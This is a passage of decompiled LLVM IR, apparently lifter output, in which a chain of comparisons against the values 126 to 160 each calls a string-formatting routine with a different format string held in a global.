dec_label_pc_c8e0:                                ; preds = %dec_label_pc_c8ac, %dec_label_pc_c8b8
  %v7_c8e4 = icmp eq i32 %v2_acd8, 126
  br i1 %v7_c8e4, label %dec_label_pc_c8ec, label %dec_label_pc_c914

dec_label_pc_c8ec:                                ; preds = %dec_label_pc_c8e0
  %v2_c8ec = ptrtoint i32* %stack_var_-36 to i32
  %v3_c8f8 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c904 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c910 = sext i8 %v3_c8f8 to i32
  %v6_c910 = sext i8 %v3_c904 to i32
  %v8_c910 = call i32 @szprintf(i32 %v2_c8ec, i32 ptrtoint ([14 x i8]* @global_var_1f5ac.322 to i32), i32 %v4_c910, i32 %v6_c910, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c914

dec_label_pc_c914:                                ; preds = %dec_label_pc_c8e0, %dec_label_pc_c8ec
  %v7_c918 = icmp eq i32 %v2_acd8, 127
  br i1 %v7_c918, label %dec_label_pc_c920, label %dec_label_pc_c948

dec_label_pc_c920:                                ; preds = %dec_label_pc_c914
  %v2_c920 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c92c = load i8, i8* @global_var_2a549.78, align 1
  %v3_c938 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c944 = sext i8 %v3_c92c to i32
  %v6_c944 = sext i8 %v3_c938 to i32
  %v8_c944 = call i32 @szprintf(i32 %v2_c920, i32 ptrtoint ([14 x i8]* @global_var_1f5cc.326 to i32), i32 %v4_c944, i32 %v6_c944, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c948

dec_label_pc_c948:                                ; preds = %dec_label_pc_c914, %dec_label_pc_c920
  %v7_c94c = icmp eq i32 %v2_acd8, 128
  br i1 %v7_c94c, label %dec_label_pc_c954, label %dec_label_pc_c97c

dec_label_pc_c954:                                ; preds = %dec_label_pc_c948
  %v2_c954 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c960 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c96c = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c978 = sext i8 %v3_c960 to i32
  %v6_c978 = sext i8 %v3_c96c to i32
  %v8_c978 = call i32 @szprintf(i32 %v2_c954, i32 ptrtoint ([14 x i8]* @global_var_1f5dc.328 to i32), i32 %v4_c978, i32 %v6_c978, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c97c

dec_label_pc_c97c:                                ; preds = %dec_label_pc_c948, %dec_label_pc_c954
  %v7_c980 = icmp eq i32 %v2_acd8, 129
  br i1 %v7_c980, label %dec_label_pc_c988, label %dec_label_pc_c9b0

dec_label_pc_c988:                                ; preds = %dec_label_pc_c97c
  %v2_c988 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c994 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c9a0 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c9ac = sext i8 %v3_c994 to i32
  %v6_c9ac = sext i8 %v3_c9a0 to i32
  %v8_c9ac = call i32 @szprintf(i32 %v2_c988, i32 ptrtoint ([14 x i8]* @global_var_1f5ec.330 to i32), i32 %v4_c9ac, i32 %v6_c9ac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c9b0

dec_label_pc_c9b0:                                ; preds = %dec_label_pc_c97c, %dec_label_pc_c988
  %v7_c9b4 = icmp eq i32 %v2_acd8, 130
  br i1 %v7_c9b4, label %dec_label_pc_c9bc, label %dec_label_pc_c9e4

dec_label_pc_c9bc:                                ; preds = %dec_label_pc_c9b0
  %v2_c9bc = ptrtoint i32* %stack_var_-36 to i32
  %v3_c9c8 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c9d4 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c9e0 = sext i8 %v3_c9c8 to i32
  %v6_c9e0 = sext i8 %v3_c9d4 to i32
  %v8_c9e0 = call i32 @szprintf(i32 %v2_c9bc, i32 ptrtoint ([14 x i8]* @global_var_1f5fc.332 to i32), i32 %v4_c9e0, i32 %v6_c9e0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c9e4

dec_label_pc_c9e4:                                ; preds = %dec_label_pc_c9b0, %dec_label_pc_c9bc
  %v7_c9e8 = icmp eq i32 %v2_acd8, 131
  br i1 %v7_c9e8, label %dec_label_pc_c9f0, label %dec_label_pc_ca18

dec_label_pc_c9f0:                                ; preds = %dec_label_pc_c9e4
  %v2_c9f0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c9fc = load i8, i8* @global_var_2a549.78, align 1
  %v3_ca08 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_ca14 = sext i8 %v3_c9fc to i32
  %v6_ca14 = sext i8 %v3_ca08 to i32
  %v8_ca14 = call i32 @szprintf(i32 %v2_c9f0, i32 ptrtoint ([14 x i8]* @global_var_1f60c.334 to i32), i32 %v4_ca14, i32 %v6_ca14, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ca18

dec_label_pc_ca18:                                ; preds = %dec_label_pc_c9e4, %dec_label_pc_c9f0
  %v7_ca1c = icmp eq i32 %v2_acd8, 132
  br i1 %v7_ca1c, label %dec_label_pc_ca24, label %dec_label_pc_ca4c

dec_label_pc_ca24:                                ; preds = %dec_label_pc_ca18
  %v2_ca24 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ca30 = load i8, i8* @global_var_2a549.78, align 1
  %v3_ca3c = load i8, i8* @global_var_2a54a.79, align 1
  %v4_ca48 = sext i8 %v3_ca30 to i32
  %v6_ca48 = sext i8 %v3_ca3c to i32
  %v8_ca48 = call i32 @szprintf(i32 %v2_ca24, i32 ptrtoint ([14 x i8]* @global_var_1f61c.336 to i32), i32 %v4_ca48, i32 %v6_ca48, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ca4c

dec_label_pc_ca4c:                                ; preds = %dec_label_pc_ca18, %dec_label_pc_ca24
  %v7_ca50 = icmp eq i32 %v2_acd8, 133
  br i1 %v7_ca50, label %dec_label_pc_ca58, label %dec_label_pc_ca80

dec_label_pc_ca58:                                ; preds = %dec_label_pc_ca4c
  %v2_ca58 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ca64 = load i8, i8* @global_var_2a549.78, align 1
  %v3_ca70 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_ca7c = sext i8 %v3_ca64 to i32
  %v6_ca7c = sext i8 %v3_ca70 to i32
  %v8_ca7c = call i32 @szprintf(i32 %v2_ca58, i32 ptrtoint ([14 x i8]* @global_var_1f62c.338 to i32), i32 %v4_ca7c, i32 %v6_ca7c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ca80

dec_label_pc_ca80:                                ; preds = %dec_label_pc_ca4c, %dec_label_pc_ca58
  %v7_ca84 = icmp eq i32 %v2_acd8, 134
  br i1 %v7_ca84, label %dec_label_pc_ca8c, label %dec_label_pc_cab4

dec_label_pc_ca8c:                                ; preds = %dec_label_pc_ca80
  %v2_ca8c = ptrtoint i32* %stack_var_-36 to i32
  %v3_ca98 = load i8, i8* @global_var_2a549.78, align 1
  %v3_caa4 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_cab0 = sext i8 %v3_ca98 to i32
  %v6_cab0 = sext i8 %v3_caa4 to i32
  %v8_cab0 = call i32 @szprintf(i32 %v2_ca8c, i32 ptrtoint ([14 x i8]* @global_var_1f63c.340 to i32), i32 %v4_cab0, i32 %v6_cab0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cab4

dec_label_pc_cab4:                                ; preds = %dec_label_pc_ca80, %dec_label_pc_ca8c
  %v7_cab8 = icmp eq i32 %v2_acd8, 135
  br i1 %v7_cab8, label %dec_label_pc_cac0, label %dec_label_pc_cae8

dec_label_pc_cac0:                                ; preds = %dec_label_pc_cab4
  %v2_cac0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cacc = load i8, i8* @global_var_2a549.78, align 1
  %v3_cad8 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_cae4 = sext i8 %v3_cacc to i32
  %v6_cae4 = sext i8 %v3_cad8 to i32
  %v8_cae4 = call i32 @szprintf(i32 %v2_cac0, i32 ptrtoint ([14 x i8]* @global_var_1f64c.342 to i32), i32 %v4_cae4, i32 %v6_cae4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cae8

dec_label_pc_cae8:                                ; preds = %dec_label_pc_cab4, %dec_label_pc_cac0
  %v7_caec = icmp eq i32 %v2_acd8, 136
  br i1 %v7_caec, label %dec_label_pc_caf4, label %dec_label_pc_cb1c

dec_label_pc_caf4:                                ; preds = %dec_label_pc_cae8
  %v2_caf4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cb00 = load i8, i8* @global_var_2a549.78, align 1
  %v3_cb0c = load i8, i8* @global_var_2a54a.79, align 1
  %v4_cb18 = sext i8 %v3_cb00 to i32
  %v6_cb18 = sext i8 %v3_cb0c to i32
  %v8_cb18 = call i32 @szprintf(i32 %v2_caf4, i32 ptrtoint ([14 x i8]* @global_var_1f65c.344 to i32), i32 %v4_cb18, i32 %v6_cb18, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cb1c

dec_label_pc_cb1c:                                ; preds = %dec_label_pc_cae8, %dec_label_pc_caf4
  %v7_cb20 = icmp eq i32 %v2_acd8, 137
  br i1 %v7_cb20, label %dec_label_pc_cb28, label %dec_label_pc_cb50

dec_label_pc_cb28:                                ; preds = %dec_label_pc_cb1c
  %v2_cb28 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cb34 = load i8, i8* @global_var_2a549.78, align 1
  %v3_cb40 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_cb4c = sext i8 %v3_cb34 to i32
  %v6_cb4c = sext i8 %v3_cb40 to i32
  %v8_cb4c = call i32 @szprintf(i32 %v2_cb28, i32 ptrtoint ([13 x i8]* @global_var_1f66c.346 to i32), i32 %v4_cb4c, i32 %v6_cb4c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cb50

dec_label_pc_cb50:                                ; preds = %dec_label_pc_cb1c, %dec_label_pc_cb28
  %v7_cb54 = icmp eq i32 %v2_acd8, 138
  br i1 %v7_cb54, label %dec_label_pc_cb5c, label %dec_label_pc_cb84

dec_label_pc_cb5c:                                ; preds = %dec_label_pc_cb50
  %v2_cb5c = ptrtoint i32* %stack_var_-36 to i32
  %v3_cb68 = load i8, i8* @global_var_2a549.78, align 1
  %v3_cb74 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_cb80 = sext i8 %v3_cb68 to i32
  %v6_cb80 = sext i8 %v3_cb74 to i32
  %v8_cb80 = call i32 @szprintf(i32 %v2_cb5c, i32 ptrtoint ([13 x i8]* @global_var_1f67c.348 to i32), i32 %v4_cb80, i32 %v6_cb80, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cb84

dec_label_pc_cb84:                                ; preds = %dec_label_pc_cb50, %dec_label_pc_cb5c
  %v7_cb88 = icmp eq i32 %v2_acd8, 139
  br i1 %v7_cb88, label %dec_label_pc_cb90, label %dec_label_pc_cbb8

dec_label_pc_cb90:                                ; preds = %dec_label_pc_cb84
  %v2_cb90 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cb9c = load i8, i8* @global_var_2a549.78, align 1
  %v3_cba8 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_cbb4 = sext i8 %v3_cb9c to i32
  %v6_cbb4 = sext i8 %v3_cba8 to i32
  %v8_cbb4 = call i32 @szprintf(i32 %v2_cb90, i32 ptrtoint ([13 x i8]* @global_var_1f68c.350 to i32), i32 %v4_cbb4, i32 %v6_cbb4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cbb8

dec_label_pc_cbb8:                                ; preds = %dec_label_pc_cb84, %dec_label_pc_cb90
  %v7_cbbc = icmp eq i32 %v2_acd8, 140
  br i1 %v7_cbbc, label %dec_label_pc_cbc4, label %dec_label_pc_cbec

dec_label_pc_cbc4:                                ; preds = %dec_label_pc_cbb8
  %v2_cbc4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cbd0 = load i8, i8* @global_var_2a549.78, align 1
  %v3_cbdc = load i8, i8* @global_var_2a54a.79, align 1
  %v4_cbe8 = sext i8 %v3_cbd0 to i32
  %v6_cbe8 = sext i8 %v3_cbdc to i32
  %v8_cbe8 = call i32 @szprintf(i32 %v2_cbc4, i32 ptrtoint ([13 x i8]* @global_var_1f69c.352 to i32), i32 %v4_cbe8, i32 %v6_cbe8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cbec

dec_label_pc_cbec:                                ; preds = %dec_label_pc_cbb8, %dec_label_pc_cbc4
  %v7_cbf0 = icmp eq i32 %v2_acd8, 141
  br i1 %v7_cbf0, label %dec_label_pc_cbf8, label %dec_label_pc_cc20

dec_label_pc_cbf8:                                ; preds = %dec_label_pc_cbec
  %v2_cbf8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cc04 = load i8, i8* @global_var_2a549.78, align 1
  %v3_cc10 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_cc1c = sext i8 %v3_cc04 to i32
  %v6_cc1c = sext i8 %v3_cc10 to i32
  %v8_cc1c = call i32 @szprintf(i32 %v2_cbf8, i32 ptrtoint ([13 x i8]* @global_var_1f6ac.354 to i32), i32 %v4_cc1c, i32 %v6_cc1c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cc20

dec_label_pc_cc20:                                ; preds = %dec_label_pc_cbec, %dec_label_pc_cbf8
  %v7_cc24 = icmp eq i32 %v2_acd8, 142
  br i1 %v7_cc24, label %dec_label_pc_cc2c, label %dec_label_pc_cc54

dec_label_pc_cc2c:                                ; preds = %dec_label_pc_cc20
  %v2_cc2c = ptrtoint i32* %stack_var_-36 to i32
  %v3_cc38 = load i8, i8* @global_var_2a549.78, align 1
  %v3_cc44 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_cc50 = sext i8 %v3_cc38 to i32
  %v6_cc50 = sext i8 %v3_cc44 to i32
  %v8_cc50 = call i32 @szprintf(i32 %v2_cc2c, i32 ptrtoint ([13 x i8]* @global_var_1f6bc.356 to i32), i32 %v4_cc50, i32 %v6_cc50, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cc54

dec_label_pc_cc54:                                ; preds = %dec_label_pc_cc20, %dec_label_pc_cc2c
  %v7_cc58 = icmp eq i32 %v2_acd8, 143
  br i1 %v7_cc58, label %dec_label_pc_cc60, label %dec_label_pc_cc88

dec_label_pc_cc60:                                ; preds = %dec_label_pc_cc54
  %v2_cc60 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cc6c = load i8, i8* @global_var_2a549.78, align 1
  %v3_cc78 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_cc84 = sext i8 %v3_cc6c to i32
  %v6_cc84 = sext i8 %v3_cc78 to i32
  %v8_cc84 = call i32 @szprintf(i32 %v2_cc60, i32 ptrtoint ([14 x i8]* @global_var_1f5ac.322 to i32), i32 %v4_cc84, i32 %v6_cc84, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cc88

dec_label_pc_cc88:                                ; preds = %dec_label_pc_cc54, %dec_label_pc_cc60
  %v7_cc8c = icmp eq i32 %v2_acd8, 144
  br i1 %v7_cc8c, label %dec_label_pc_cc94, label %dec_label_pc_ccbc

dec_label_pc_cc94:                                ; preds = %dec_label_pc_cc88
  %v2_cc94 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cca0 = load i8, i8* @global_var_2a549.78, align 1
  %v3_ccac = load i8, i8* @global_var_2a54a.79, align 1
  %v4_ccb8 = sext i8 %v3_cca0 to i32
  %v6_ccb8 = sext i8 %v3_ccac to i32
  %v8_ccb8 = call i32 @szprintf(i32 %v2_cc94, i32 ptrtoint ([14 x i8]* @global_var_1f6cc.358 to i32), i32 %v4_ccb8, i32 %v6_ccb8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ccbc

dec_label_pc_ccbc:                                ; preds = %dec_label_pc_cc88, %dec_label_pc_cc94
  %v7_ccc0 = icmp eq i32 %v2_acd8, 145
  br i1 %v7_ccc0, label %dec_label_pc_ccc8, label %dec_label_pc_ccf0

dec_label_pc_ccc8:                                ; preds = %dec_label_pc_ccbc
  %v2_ccc8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ccd4 = load i8, i8* @global_var_2a549.78, align 1
  %v3_cce0 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_ccec = sext i8 %v3_ccd4 to i32
  %v6_ccec = sext i8 %v3_cce0 to i32
  %v8_ccec = call i32 @szprintf(i32 %v2_ccc8, i32 ptrtoint ([14 x i8]* @global_var_1f6dc.360 to i32), i32 %v4_ccec, i32 %v6_ccec, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ccf0

dec_label_pc_ccf0:                                ; preds = %dec_label_pc_ccbc, %dec_label_pc_ccc8
  %v7_ccf4 = icmp eq i32 %v2_acd8, 146
  br i1 %v7_ccf4, label %dec_label_pc_ccfc, label %dec_label_pc_cd24

dec_label_pc_ccfc:                                ; preds = %dec_label_pc_ccf0
  %v2_ccfc = ptrtoint i32* %stack_var_-36 to i32
  %v3_cd08 = load i8, i8* @global_var_2a549.78, align 1
  %v3_cd14 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_cd20 = sext i8 %v3_cd08 to i32
  %v6_cd20 = sext i8 %v3_cd14 to i32
  %v8_cd20 = call i32 @szprintf(i32 %v2_ccfc, i32 ptrtoint ([14 x i8]* @global_var_1f6ec.362 to i32), i32 %v4_cd20, i32 %v6_cd20, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cd24

dec_label_pc_cd24:                                ; preds = %dec_label_pc_ccf0, %dec_label_pc_ccfc
  %v7_cd28 = icmp eq i32 %v2_acd8, 147
  br i1 %v7_cd28, label %dec_label_pc_cd30, label %dec_label_pc_cd58

dec_label_pc_cd30:                                ; preds = %dec_label_pc_cd24
  %v2_cd30 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cd3c = load i8, i8* @global_var_2a549.78, align 1
  %v3_cd48 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_cd54 = sext i8 %v3_cd3c to i32
  %v6_cd54 = sext i8 %v3_cd48 to i32
  %v8_cd54 = call i32 @szprintf(i32 %v2_cd30, i32 ptrtoint ([13 x i8]* @global_var_1f6fc.364 to i32), i32 %v4_cd54, i32 %v6_cd54, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cd58

dec_label_pc_cd58:                                ; preds = %dec_label_pc_cd24, %dec_label_pc_cd30
  %v7_cd5c = icmp eq i32 %v2_acd8, 148
  br i1 %v7_cd5c, label %dec_label_pc_cd64, label %dec_label_pc_cd8c

dec_label_pc_cd64:                                ; preds = %dec_label_pc_cd58
  %v2_cd64 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cd70 = load i8, i8* @global_var_2a549.78, align 1
  %v3_cd7c = load i8, i8* @global_var_2a54a.79, align 1
  %v4_cd88 = sext i8 %v3_cd70 to i32
  %v6_cd88 = sext i8 %v3_cd7c to i32
  %v8_cd88 = call i32 @szprintf(i32 %v2_cd64, i32 ptrtoint ([13 x i8]* @global_var_1f70c.366 to i32), i32 %v4_cd88, i32 %v6_cd88, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cd8c

dec_label_pc_cd8c:                                ; preds = %dec_label_pc_cd58, %dec_label_pc_cd64
  %v7_cd90 = icmp eq i32 %v2_acd8, 149
  br i1 %v7_cd90, label %dec_label_pc_cd98, label %dec_label_pc_cdc0

dec_label_pc_cd98:                                ; preds = %dec_label_pc_cd8c
  %v2_cd98 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cda4 = load i8, i8* @global_var_2a549.78, align 1
  %v3_cdb0 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_cdbc = sext i8 %v3_cda4 to i32
  %v6_cdbc = sext i8 %v3_cdb0 to i32
  %v8_cdbc = call i32 @szprintf(i32 %v2_cd98, i32 ptrtoint ([14 x i8]* @global_var_1f71c.369 to i32), i32 %v4_cdbc, i32 %v6_cdbc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cdc0

dec_label_pc_cdc0:                                ; preds = %dec_label_pc_cd8c, %dec_label_pc_cd98
  %v7_cdc4 = icmp eq i32 %v2_acd8, 150
  br i1 %v7_cdc4, label %dec_label_pc_cdcc, label %dec_label_pc_cdf4

dec_label_pc_cdcc:                                ; preds = %dec_label_pc_cdc0
  %v2_cdcc = ptrtoint i32* %stack_var_-36 to i32
  %v3_cdd8 = load i8, i8* @global_var_2a549.78, align 1
  %v3_cde4 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_cdf0 = sext i8 %v3_cdd8 to i32
  %v6_cdf0 = sext i8 %v3_cde4 to i32
  %v8_cdf0 = call i32 @szprintf(i32 %v2_cdcc, i32 ptrtoint ([14 x i8]* @global_var_1f72c.371 to i32), i32 %v4_cdf0, i32 %v6_cdf0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cdf4

dec_label_pc_cdf4:                                ; preds = %dec_label_pc_cdc0, %dec_label_pc_cdcc
  %v7_cdf8 = icmp eq i32 %v2_acd8, 151
  br i1 %v7_cdf8, label %dec_label_pc_ce00, label %dec_label_pc_ce28

dec_label_pc_ce00:                                ; preds = %dec_label_pc_cdf4
  %v2_ce00 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ce0c = load i8, i8* @global_var_2a549.78, align 1
  %v3_ce18 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_ce24 = sext i8 %v3_ce0c to i32
  %v6_ce24 = sext i8 %v3_ce18 to i32
  %v8_ce24 = call i32 @szprintf(i32 %v2_ce00, i32 ptrtoint ([14 x i8]* @global_var_1f73c.373 to i32), i32 %v4_ce24, i32 %v6_ce24, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ce28

dec_label_pc_ce28:                                ; preds = %dec_label_pc_cdf4, %dec_label_pc_ce00
  %v7_ce2c = icmp eq i32 %v2_acd8, 152
  br i1 %v7_ce2c, label %dec_label_pc_ce34, label %dec_label_pc_ce5c

dec_label_pc_ce34:                                ; preds = %dec_label_pc_ce28
  %v2_ce34 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ce40 = load i8, i8* @global_var_2a549.78, align 1
  %v3_ce4c = load i8, i8* @global_var_2a54a.79, align 1
  %v4_ce58 = sext i8 %v3_ce40 to i32
  %v6_ce58 = sext i8 %v3_ce4c to i32
  %v8_ce58 = call i32 @szprintf(i32 %v2_ce34, i32 ptrtoint ([14 x i8]* @global_var_1f520.304 to i32), i32 %v4_ce58, i32 %v6_ce58, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ce5c

dec_label_pc_ce5c:                                ; preds = %dec_label_pc_ce28, %dec_label_pc_ce34
  %v7_ce60 = icmp eq i32 %v2_acd8, 153
  br i1 %v7_ce60, label %dec_label_pc_ce68, label %dec_label_pc_ce90

dec_label_pc_ce68:                                ; preds = %dec_label_pc_ce5c
  %v2_ce68 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ce74 = load i8, i8* @global_var_2a549.78, align 1
  %v3_ce80 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_ce8c = sext i8 %v3_ce74 to i32
  %v6_ce8c = sext i8 %v3_ce80 to i32
  %v8_ce8c = call i32 @szprintf(i32 %v2_ce68, i32 ptrtoint ([13 x i8]* @global_var_1f74c.376 to i32), i32 %v4_ce8c, i32 %v6_ce8c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ce90

dec_label_pc_ce90:                                ; preds = %dec_label_pc_ce5c, %dec_label_pc_ce68
  %v7_ce94 = icmp eq i32 %v2_acd8, 154
  br i1 %v7_ce94, label %dec_label_pc_ce9c, label %dec_label_pc_cec4

dec_label_pc_ce9c:                                ; preds = %dec_label_pc_ce90
  %v2_ce9c = ptrtoint i32* %stack_var_-36 to i32
  %v3_cea8 = load i8, i8* @global_var_2a549.78, align 1
  %v3_ceb4 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_cec0 = sext i8 %v3_cea8 to i32
  %v6_cec0 = sext i8 %v3_ceb4 to i32
  %v8_cec0 = call i32 @szprintf(i32 %v2_ce9c, i32 ptrtoint ([13 x i8]* @global_var_1f75c.378 to i32), i32 %v4_cec0, i32 %v6_cec0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cec4

dec_label_pc_cec4:                                ; preds = %dec_label_pc_ce90, %dec_label_pc_ce9c
  %v7_cec8 = icmp eq i32 %v2_acd8, 155
  br i1 %v7_cec8, label %dec_label_pc_ced0, label %dec_label_pc_cef8

dec_label_pc_ced0:                                ; preds = %dec_label_pc_cec4
  %v2_ced0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cedc = load i8, i8* @global_var_2a549.78, align 1
  %v3_cee8 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_cef4 = sext i8 %v3_cedc to i32
  %v6_cef4 = sext i8 %v3_cee8 to i32
  %v8_cef4 = call i32 @szprintf(i32 %v2_ced0, i32 ptrtoint ([13 x i8]* @global_var_1f76c.380 to i32), i32 %v4_cef4, i32 %v6_cef4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cef8

dec_label_pc_cef8:                                ; preds = %dec_label_pc_cec4, %dec_label_pc_ced0
  %v7_cefc = icmp eq i32 %v2_acd8, 156
  br i1 %v7_cefc, label %dec_label_pc_cf04, label %dec_label_pc_cf2c

dec_label_pc_cf04:                                ; preds = %dec_label_pc_cef8
  %v2_cf04 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cf10 = load i8, i8* @global_var_2a549.78, align 1
  %v3_cf1c = load i8, i8* @global_var_2a54a.79, align 1
  %v4_cf28 = sext i8 %v3_cf10 to i32
  %v6_cf28 = sext i8 %v3_cf1c to i32
  %v8_cf28 = call i32 @szprintf(i32 %v2_cf04, i32 ptrtoint ([13 x i8]* @global_var_1f77c.382 to i32), i32 %v4_cf28, i32 %v6_cf28, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cf2c

dec_label_pc_cf2c:                                ; preds = %dec_label_pc_cef8, %dec_label_pc_cf04
  %v7_cf30 = icmp eq i32 %v2_acd8, 157
  br i1 %v7_cf30, label %dec_label_pc_cf38, label %dec_label_pc_cf60

dec_label_pc_cf38:                                ; preds = %dec_label_pc_cf2c
  %v2_cf38 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cf44 = load i8, i8* @global_var_2a549.78, align 1
  %v3_cf50 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_cf5c = sext i8 %v3_cf44 to i32
  %v6_cf5c = sext i8 %v3_cf50 to i32
  %v8_cf5c = call i32 @szprintf(i32 %v2_cf38, i32 ptrtoint ([13 x i8]* @global_var_1f78c.384 to i32), i32 %v4_cf5c, i32 %v6_cf5c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cf60

dec_label_pc_cf60:                                ; preds = %dec_label_pc_cf2c, %dec_label_pc_cf38
  %v7_cf64 = icmp eq i32 %v2_acd8, 158
  br i1 %v7_cf64, label %dec_label_pc_cf6c, label %dec_label_pc_cf94

dec_label_pc_cf6c:                                ; preds = %dec_label_pc_cf60
  %v2_cf6c = ptrtoint i32* %stack_var_-36 to i32
  %v3_cf78 = load i8, i8* @global_var_2a549.78, align 1
  %v3_cf84 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_cf90 = sext i8 %v3_cf78 to i32
  %v6_cf90 = sext i8 %v3_cf84 to i32
  %v8_cf90 = call i32 @szprintf(i32 %v2_cf6c, i32 ptrtoint ([12 x i8]* @global_var_1f79c.386 to i32), i32 %v4_cf90, i32 %v6_cf90, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cf94

dec_label_pc_cf94:                                ; preds = %dec_label_pc_cf60, %dec_label_pc_cf6c
  %v7_cf98 = icmp eq i32 %v2_acd8, 159
  br i1 %v7_cf98, label %dec_label_pc_cfa0, label %dec_label_pc_cfc8

dec_label_pc_cfa0:                                ; preds = %dec_label_pc_cf94
  %v2_cfa0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cfac = load i8, i8* @global_var_2a549.78, align 1
  %v3_cfb8 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_cfc4 = sext i8 %v3_cfac to i32
  %v6_cfc4 = sext i8 %v3_cfb8 to i32
  %v8_cfc4 = call i32 @szprintf(i32 %v2_cfa0, i32 ptrtoint ([14 x i8]* @global_var_1f7a8.388 to i32), i32 %v4_cfc4, i32 %v6_cfc4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cfc8

dec_label_pc_cfc8:                                ; preds = %dec_label_pc_cf94, %dec_label_pc_cfa0
  %v7_cfcc = icmp eq i32 %v2_acd8, 160
  br i1 %v7_cfcc, label %dec_label_pc_cfd4, label %dec_label_pc_cffc

dec_label_pc_cfd4:                                ; preds = %dec_label_pc_cfc8
  %v2_cfd4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cfe0 = load i8, i8* @global_var_2a549.78, align 1
  %v3_cfec = load i8, i8* @global_var_2a54a.79, align 1
  %v4_cff8 = sext i8 %v3_cfe0 to i32
  %v6_cff8 = sext i8 %v3_cfec to i32
  %v8_cff8 = call i32 @szprintf(i32 %v2_cfd4, i32 ptrtoint ([13 x i8]* @global_var_1f7b8.390 to i32), i32 %v4_cff8, i32 %v6_cff8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cffc

dec_label_pc_cffc:                                ; preds = %dec_label_pc_cfc8, %dec_label_pc_cfd4
